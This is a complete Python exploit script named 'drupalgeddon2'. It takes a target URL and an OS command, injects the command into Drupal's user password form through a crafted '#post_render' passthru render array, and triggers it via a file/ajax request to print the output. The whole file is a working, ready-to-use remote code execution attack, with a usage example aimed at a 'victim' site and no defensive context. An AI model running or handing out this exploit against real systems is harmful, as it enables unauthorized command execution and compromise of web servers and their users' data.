#!/usr/bin/python
# coding: utf-8



import requests
import re
import sys
import os
import getopt
from pprint import pprint
target=""
command=""

def exploit(url_target,os_command):
    parametros = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':os_command, 'name[#type]':'markup'}
    datos = {'form_id':'user_pass', '_triggering_element_name':'name'}
    r = requests.post(url_target, data=datos, params=parametros)
    m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
    if m:
        found = m.group(1)
        parametros = {'q':'file/ajax/name/#value/' + found}
        datos = {'form_build_id':found}
        r = requests.post(url_target, data=datos, params=parametros)
        r.encoding = 'ISO-8859-1'
        salida = r.content.split("[{")
        print salida[0]

def usage():
    comm = os.path.basename(sys.argv[0])

    if os.path.dirname(sys.argv[0]) == os.getcwd():
        comm = "./" + comm

    print ("Usage: drupalgeddon2 options \n")
    print ("       -h: Url target")
    print ("       -c: OS command")
    print ("\nExamples:")
    print ("        " + comm + " -h http://www.victim.com -c 'ls -la'")
    print ("")

def start(argv):
    if len(sys.argv) < 5:
        usage()
        sys.exit()
    try:
        opts, args = getopt.getopt(argv, 'h:c:')
    except getopt.GetoptError:
        usage()
        sys.exit()
    for opt, arg in opts:
        if opt == '-h':
          target = arg
        if opt == '-c':
          command = arg
    exploit(target,command)
    sys.exit()

if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print ("Search interrupted by user..")
    except:
        sys.exit()
